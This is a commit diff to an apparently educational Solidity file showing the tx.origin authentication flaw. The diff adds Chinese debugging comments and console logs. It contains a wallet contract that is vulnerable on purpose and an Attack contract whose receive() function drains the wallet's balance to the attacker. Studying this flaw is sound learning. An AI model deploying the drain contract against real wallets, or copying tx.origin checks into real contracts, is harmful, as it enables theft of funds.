20c3073cd850f8423461913ed4acded4078dace1
lulutoy <487676503@qq.com>
2024-04-02 11:09:55 +0800

    update txOrigin.sol

--- txOriginAttack/txOrigin.sol
+++ txOriginAttack/txOrigin.sol
@@ -2,6 +2,7 @@ pragma solidity 0.8.11;
 
 import "hardhat/console.sol";
 
+// MyWallet合约地址：0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE
 contract MyWallet {
     address owner1;
     constructor() payable {
@@ -15,10 +16,17 @@ contract MyWallet {
     // tx.origin的值仍然是那个外部账户（即攻击者的账户），而不是Attack合约。
     // 这是因为tx.origin表示的是交易的原始发起者，即第一个（也是最终的）交易发起者
     function transferTo(address payable dest, uint _mount) public {
-        // tx.origin: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
+        // 执行dest.call{value: _mount}("")语句前
+        // tx.origin: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 
         // owner1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
         // msg.sender: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 
-        console.log("msg.sender: ", msg.sender, " owner1: ",owner1);
+
+        // 执行dest.call{value: _mount}("")语句后
+        // tx.origin: : 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
+        // owner1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
+        // msg.sender: 0x5802016Bc9976C6f63D6170157adAeA1924586c1
+        console.log("tx.origin: : ", tx.origin, " owner1: ",owner1);
+        console.log("msg.sender: ", msg.sender);
         require(tx.origin == owner1);
         (bool success, ) = dest.call{value: _mount}("");
         require(success);
@@ -29,6 +37,7 @@ interface UserWallet {
     function transferTo(address payable dest, uint _amount) external ;
 }
 
+// Attack合约地址：0x5802016Bc9976C6f63D6170157adAeA1924586c1
 contract Attack {
     address payable owner2;
     constructor() payable {
@@ -38,10 +47,13 @@ contract Attack {
     }
 
     // 部署MyWallet合约的外部账户调用TransferTo方法时，不是把以太币转给Attack合约，
-    // 而是转给部署Attack合约的外部账户,也就是下面这个receive()函数没有调用
+    // 而是转给部署Attack合约的外部账户
     receive() payable external{
-        // 这里的msg.sender指向MyWallet合约的地址 msg.sender = 
+        // 这里的msg.sender指向MyWallet合约的地址 
+        // msg.sender = 0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE  
+        // owner2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
         console.log("msg.sender: ", msg.sender, " msg.value: ", msg.value);
+        console.log("owner2: ", owner2);
         UserWallet(msg.sender).transferTo(owner2, msg.sender.balance - msg.value);
     }
 }
